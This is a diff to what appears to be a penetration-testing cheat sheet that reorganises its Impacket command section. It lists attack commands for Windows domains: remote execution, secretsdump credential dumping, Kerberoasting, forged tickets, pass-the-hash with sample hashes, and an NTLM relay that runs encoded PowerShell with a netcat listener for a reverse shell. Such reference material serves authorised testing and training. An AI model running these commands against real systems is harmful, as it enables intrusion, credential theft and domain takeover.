@@ -3079,36 +3079,28 @@ evil-winrm -i <RHOST> -c /PATH/TO/CERTIFICATE/<CERTIFICATE>.crt -k /PATH/TO/PRIV
 
 #### Impacket
 
+##### impacket-atexec
+
 ```c
-impacket-atexec -k -no-pass <DOMAIN>/Administrator@<DOMAIN_CONTROLLER>.<DOMAIN> 'type C:\PATH\TO\FILE\<FILE>'
+impacket-atexec -k -no-pass <DOMAIN>/Administrator@<RHOST> 'type C:\PATH\TO\FILE\<FILE>'
+```
+
+##### impacket-dcomexec
+
+```c
+impacket-dcomexec -object MMC20 -debug -silentcommand <DOMAIN>/<USERNAME>:'<PASSWORD>'<RHOST> '<COMMAND>'
+```
+
+##### impacket-findDelegation
+
+```c
+impacket-findDelegation <DOMAIN>/<USERNAME> -hashes :<HASH>
+```
+
+##### impacket-GetADUsers
+
+```c
 impacket-GetADUsers -all -dc-ip <RHOST> <DOMAIN>/
-impacket-getST <DOMAIN>/<USERNAME>$ -spn WWW/<DOMAIN_CONTROLLER>.<DOMAIN> -hashes :d64b83fe606e6d3005e20ce0ee932fe2 -impersonate Administrator
-impacket-lookupsid <DOMAIN>/<USERNAME>:<PASSWORD/PASSWORD_HASH>@<RHOST>
-impacket-netview <DOMAIN>/<USERNAME> -targets /PATH/TO/FILE/<FILE>.txt -users /PATH/TO/FILE/<FILE>.txt
-impacket-reg <DOMAIN>/<USERNAME>:<PASSWORD:PASSWORD_HASH>@<RHOST> <ACTION> <ACTION>
-impacket-rpcdump <DOMAIN>/<USERNAME>:<PASSWORD/PASSWORD_HASH>@<RHOST>
-impacket-samrdump <DOMAIN>/<USERNAME>:<PASSWORD/PASSWORD_HASH>@<RHOST>
-impacket-services <DOMAIN>/<USERNAME>:<PASSWORD/PASSWORD_HASH>@<RHOST> <ACTION>
-impacket-smbpasswd <RHOST>/<USERNAME>:'<PASSWORD>'@<RHOST> -newpass '<PASSWORD>'
-impacket-smbserver local . -smb2support
-```
-
-##### impacket-smbclient
-
-```c
-impacket-smbclient <DOMAIN>/<USERNAME>:<PASSWORD/PASSWORD_HASH>@<RHOST>
-```
-
-```c
-export KRB5CCNAME=<USERNAME>.ccache
-impacket-smbclient -k <DOMAIN>/<USERNAME>@<RHOST>.<DOMAIN> -no-pass
-```
-
-##### impacket-getTGT
-
-```c
-impacket-getTGT <RHOST>/<USERNAME>:<PASSWORD>
-impacket-getTGT <RHOST>/<USERNAME> -dc-ip <RHOST> -hashes aad3b435b51404eeaad3b435b51404ee:7c662956a4a0486a80fbb2403c5a9c2c
 ```
 
 ##### impacket-GetNPUsers
@@ -3117,6 +3109,20 @@ impacket-getTGT <RHOST>/<USERNAME> -dc-ip <RHOST> -hashes aad3b435b51404eeaad3b4
 impacket-GetNPUsers <DOMAIN>/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
 impacket-GetNPUsers <DOMAIN>/ -usersfile usernames.txt -format john -outputfile hashes
 impacket-GetNPUsers <DOMAIN>/<USERNAME> -request -no-pass -dc-ip <RHOST>
+```
+
+##### impacket-getST
+
+```c
+impacket-getST <DOMAIN>/<USERNAME> -spn <USERNAME>/<RHOST> -hashes :<HASH> -impersonate <USERNAME>
+impacket-getST <DOMAIN>/<USERNAME>$ -spn <USERNAME>/<RHOST> -hashes :<HASH> -impersonate <USERNAME>
+```
+
+##### impacket-getTGT
+
+```c
+impacket-getTGT <DOMAIN>/<USERNAME>:<PASSWORD>
+impacket-getTGT <DOMAIN>/<USERNAME> -dc-ip <DOMAIN> -hashes aad3b435b51404eeaad3b435b51404ee:7c662956a4a0486a80fbb2403c5a9c2c
 ```
 
 ##### impacket-getUserSPNs
@@ -3128,6 +3134,65 @@ impacket-GetUserSPNs -request -dc-ip <RHOST> <DOMAIN>/<USERNAME>
 ```c
 export KRB5CCNAME=<USERNAME>.ccache
 impacket-GetUserSPNs <DOMAIN>/<USERNAME>:<PASSWORD> -k -dc-ip <RHOST>.<DOMAIN> -no-pass -request
+```
+
+##### impacket-lookupsid
+
+```c
+impacket-lookupsid <DOMAIN>/<USERNAME>:<PASSWORD/PASSWORD_HASH>@<RHOST>
+```
+
+##### impacket-netview
+
+```c
+impacket-netview <DOMAIN>/<USERNAME> -targets /PATH/TO/FILE/<FILE>.txt -users /PATH/TO/FILE/<FILE>.txt
+```
+
+##### impacket-ntlmrelayx
+
+###### Common Commands
+
+```c
+impacket-ntlmrelayx -t ldap://<RHOST> --no-wcf-server --escalate-user <USERNAME>
+```
+
+###### Example
+
+```c
+impacket-ntlmrelayx --no-http-server -smb2support -t <RHOST> -c "powershell -enc JABjAGwAaQBlAG4AdA<--- CUT FOR BREVITY --->"
+```
+
+```c
+dir \\<LHOST>\foobar
+```
+
+```c
+nc -lnvp <LPORT>
+```
+
+##### impacket-psexec
+
+```c
+impacket-psexec <USERNAME>@<RHOST>
+impacket-psexec <DOMAIN>/administrator@<RHOST> -hashes aad3b435b51404eeaad3b435b51404ee:8a4b77d52b1845bfe949ed1b9643bb18
+```
+
+##### impacket-req
+
+```c
+impacket-reg <DOMAIN>/<USERNAME>:<PASSWORD:PASSWORD_HASH>@<RHOST> <COMMAND> <COMMAND>
+```
+
+##### impacket-rpcdump
+
+```c
+impacket-rpcdump <DOMAIN>/<USERNAME>:<PASSWORD/PASSWORD_HASH>@<RHOST>
+```
+
+##### impacket-samrdump
+
+```c
+impacket-samrdump <DOMAIN>/<USERNAME>:<PASSWORD/PASSWORD_HASH>@<RHOST>
 ```
 
 ##### impacket-secretsdump
@@ -3144,11 +3209,33 @@ export KRB5CCNAME=<USERNAME>.ccache
 impacket-secretsdump -k <DOMAIN>/<USERNAME>@<RHOST>.<DOMAIN> -no-pass -debug
 ```
 
-##### impacket-psexec
+##### impacket-services
 
 ```c
-impacket-psexec <USERNAME>@<RHOST>
-impacket-psexec <RHOST>/administrator@<RHOST> -hashes aad3b435b51404eeaad3b435b51404ee:8a4b77d52b1845bfe949ed1b9643bb18
+impacket-services <DOMAIN>/<USERNAME>:<PASSWORD/PASSWORD_HASH>@<RHOST> <COMMAND>
+```
+
+##### impacket-smbclient
+
+```c
+impacket-smbclient <DOMAIN>/<USERNAME>:<PASSWORD/PASSWORD_HASH>@<RHOST>
+```
+
+```c
+export KRB5CCNAME=<USERNAME>.ccache
+impacket-smbclient -k <DOMAIN>/<USERNAME>@<RHOST>.<DOMAIN> -no-pass
+```
+
+##### impacket-smbpasswd
+
+```c
+impacket-smbpasswd <RHOST>/<USERNAME>:'<PASSWORD>'@<RHOST> -newpass '<PASSWORD>'
+```
+
+##### impacket-smbserver
+
+```c
+impacket-smbserver local . -smb2support
 ```
 
 ##### impacket-ticketer
@@ -3161,21 +3248,21 @@ impacket-psexec <RHOST>/administrator@<RHOST> -hashes aad3b435b51404eeaad3b435b5
 
 ```c
 export KRB5CCNAME=<USERNAME>.ccache
-impacket-ticketer -nthash C1929E1263DDFF6A2BCC6E053E705F78 -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -domain <RHOST> -spn MSSQLSVC/<RHOST>.<RHOST> -user-id 500 Administrator
+impacket-ticketer -nthash C1929E1263DDFF6A2BCC6E053E705F78 -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -domain <DOMAIN> -spn MSSQLSVC/<RHOST>.<DOMAIN> -user-id 500 Administrator
 ```
 
-##### Fixing [-] exceptions must derive from BaseException
+###### Fixing [-] exceptions must derive from BaseException
 
 ###### Issue
 
 ```c
-impacket-GetUserSPNs <RHOST>/<USERNAME>:<PASSWORD> -k -dc-ip <DOMAIN_CONTROLLER>.<RHOST> -no-pass -request
+impacket-GetUserSPNs <DOMAIN>/<USERNAME>:<PASSWORD> -k -dc-ip <DOMAIN_CONTROLLER>.<DOMAIN> -no-pass -request
 Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 
 [-] exceptions must derive from BaseException
 ```
 
-###### How to fix it
+###### To fix it
 
 ```c
 241         if self.__doKerberos:
@@ -3208,6 +3295,15 @@ Then put the `msada_guids.py` into the same directory as `dacledit.py`
 
 ```c
 python3 owneredit.py -k '<DOMAIN>/<USERNAME>:<PASSWORD>' -dc-ip <RHOST> -action write -new-owner '<USERNAME>' -target '<GROUP>' -debug
+```
+
+##### ThePorgs Fork
+
+```c
+pipenv shell
+git clone https://github.com/ThePorgs/impacket/
+pip3 install -r requirements.txt
+sudo python3 setup.py install
 ```
 
 #### JAWS
